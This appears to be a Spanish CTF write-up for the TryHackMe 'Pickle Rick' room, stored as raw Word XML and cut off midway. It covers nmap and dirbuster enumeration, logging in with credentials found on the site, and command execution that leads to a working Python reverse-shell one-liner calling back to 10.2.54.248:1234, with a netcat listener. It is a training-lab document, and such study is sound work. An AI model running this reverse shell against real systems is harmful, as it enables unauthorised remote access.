<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"><w:body><w:p><w:pPr><w:pStyle w:val="Heading1" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="5334000" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="img" title="fig:" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId20" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="5334000" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:bookmarkStart w:id="47" w:name="pickle-rick" /><w:p><w:pPr><w:pStyle w:val="Heading1" /></w:pPr><w:r><w:t xml:space="preserve">Pickle Rick</w:t></w:r></w:p><w:p><w:r><w:pict><v:rect style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" /></w:pict></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Primero comenzaremos realizando un scanning a nuestro target en nuestro caso la ip</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">10.10.199.221</w:t></w:r><w:r><w:t xml:space="preserve">. En este caso usaremos nuestro querido y amado NMAP, para realizar la primera fase de enumeración.</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">nmap -sS --min-rate=5000 -p- -Pn -n -vvv 10.10.199.221 -oG allports</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-sS</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; Realizamos un Sync port scan, esto hace que el escaneo sea más rápido debido a el método que utiliza.</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">--min-rate=5000</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; No emitir paquetes menores de 5000 por segundo.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-p-</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; Hacer scanning en todos los puertos</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">65535</w:t></w:r><w:r><w:t xml:space="preserve">.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-Pn</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; Esto es para skipear el host discovery.</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-n</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; Para no hacer resolución DNS.</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-vvv</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; Indicamos un triple</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">verbose</w:t></w:r><w:r><w:t xml:space="preserve">, para que nos brinde información.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">-oG</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">&gt;&gt; indicamos que el output del scanning se guardará en formato grep-peable en el fichero que especificamos.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Estos fueron los puertos que se encontraron abiertos durante el escaneo:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">PORT   STATE SERVICE REASON</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">22/tcp open  ssh     syn-ack ttl 61</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">80/tcp open  http    syn-ack ttl 61</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Como vemos que tenemos el puerto</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">80/tcp</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">abierto, de lejos nos indica a que puede ser una página web, por lo tanto vamos a comprobar. Y... Efectivamente es una página web, pudimos extraer información de la misma utilizando ciertos plugins dentro del navegador.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="3463358" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206205752451" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206205752451.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId21" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="3463358" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="22" w:name="fig1" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>1</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="22" /><w:r><w:t xml:space="preserve">image-20211206205752451</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">La página es la siguiente, y vemos que nos deja algunos</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">hints</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">dentro de ella.</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="2011341" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206205843758.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId23" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="2011341" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="24" w:name="fig2" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>2</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="24" /></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="2494071" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206205957130" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206205957130.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId25" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="2494071" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="26" w:name="fig3" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>3</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="26" /><w:r><w:t xml:space="preserve">image-20211206205957130</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Vemos que hemos conseguido un</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">User</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">potencial.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">Username: R1ckRul3s</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Ahora para seguir haciendo un poco de enumeración manual, accederemos al robots.txt, para verificar que existe, y efectivamente es así, vemos que solo hay unas cuántas letras random, pero la tendremos aquí, deberán servir para algo:</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">Wubbalubbadubdub</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Ahora procederemos a realizar un poco de fuzzing con</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">dirpbuster</w:t></w:r><w:r><w:t xml:space="preserve">, estos fueron los parámetros que utilizamos:</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">dirbuster -l /usr/share/wordlists/rockyou.txt -e html,php -u http://10.10.199.221</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">-l para indicar el wordlist que usaremos.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">-e para indicar las extensiones que usaremos.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">-u para indicar nuestro target.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Esperando unos segundos para el resultado nos encontramos con un portal de login que tiene la página, con el nombre de</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">login.php</w:t></w:r><w:r><w:t xml:space="preserve">, también nos encontramos con un</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">portal.php</w:t></w:r><w:r><w:t xml:space="preserve">, pero este nos redirige a login.php.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="3798031" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206211644949" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206211644949.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId27" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="3798031" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="28" w:name="fig4" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>4</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="28" /><w:r><w:t xml:space="preserve">image-20211206211644949</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="2539072" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206211748758" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206211748758.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId29" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="2539072" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="30" w:name="fig5" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>5</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="30" /><w:r><w:t xml:space="preserve">image-20211206211748758</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Sabemos que tenemos un usuario y una contraseña potencial, así que intentaremos.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">Username: R1ckRul3s</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">Password: Wubbalubbadubdub</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">Perfecto !!!</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">hemos obtenido acceso.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Tenemos varias secciones, pero si les soy sincero, me interesa más la de commands.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="1233506" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206212310279.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId31" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="1233506" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="32" w:name="fig6" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>6</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="32" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Algo que podemos realizar es ver, si podemos ejecutar comandos directamente desde aquí, daremos un ls, y vemos que podemos contestar la primera pregunta si hacemos un</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">cat Sup3rS3cretPickl3Ingred.txt</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="2485907" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206213531166" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206213531166.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId33" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="2485907" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="34" w:name="fig7" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>7</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="34" /><w:r><w:t xml:space="preserve">image-20211206213531166</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Vemos que la página es un poco troll, y al hacer cat no nos deja, pues... lo que haremos es ver si podemos hacer ejecución de otros binarios que nos puedan permitir una reverse shell, por ejemplo con python 3, si usamos el siguiente comando podemos comprobar:</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">python3 -c &quot;print(&#39;Jamiel&#39;)&quot;</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="2803639" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="image-20211206213917180" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206213917180.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId35" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="2803639" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="36" w:name="fig8" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>8</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="36" /><w:r><w:t xml:space="preserve">image-20211206213917180</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">Yupii !!!!</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:t xml:space="preserve">Vemos que tenemos ejecución, por lo tanto usaremos in oneliner con python3 que nos permitirá ganar acceso a la máquina directamente:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.2.54.248&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Para esto en paralelo tendremos que correr nuestro netcat en nuestra terminal:</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">nc -lnvp 1234</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BlockText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">Esto se tiene que hacer antes de ejecutar el onliner de python3</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Una vez tengamos ready el el</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">netcat</w:t></w:r><w:r><w:t xml:space="preserve">, ejecutamos nuestro</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">oneliner</w:t></w:r><w:r><w:t xml:space="preserve">, recordar que tenemos que ajustar la ip y el puerto según nuestros requerimientos y pufff, hemos obtenido acceso al serv.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="1034955" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206214956105.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId37" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="1034955" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="38" w:name="fig9" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>9</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="38" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Ahora si podemos ver el primer ingrediente</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="3937000" cy="622300" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr 